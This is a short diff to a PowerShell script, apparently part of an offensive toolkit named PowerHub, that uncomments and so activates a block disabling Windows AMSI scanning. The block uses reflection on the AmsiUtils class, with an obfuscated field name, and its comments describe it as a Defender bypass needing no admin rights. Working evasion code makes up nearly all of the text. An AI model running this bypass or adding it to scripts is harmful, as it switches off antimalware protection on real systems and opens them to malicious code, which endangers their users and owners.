@@ -10,14 +10,14 @@ Write-Host @"
 Run 'Help-PowerHub' for help
 "@
 
-# Try {
-#     # Bypass Win10 Defender, no admin required
-#     # Reqires some obfuscation
-#     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSySSFailed'.replace('SySS','Init'),'NonPublic,Static').SetValue($null,$true)
-#     Write-Host "[+] Disabled AMSI"
-# } Catch {
-#     Write-Host "[-] Failed to disable AMSI"
-# }
+Try {
+    # Bypass Win10 Defender, no admin required
+    # Reqires some obfuscation
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSySSFailed'.replace('SySS','Init'),'NonPublic,Static').SetValue($null,$true)
+    Write-Host "[+] Disabled AMSI"
+} Catch {
+    Write-Host "[-] Failed to disable AMSI"
+}
 
 
 
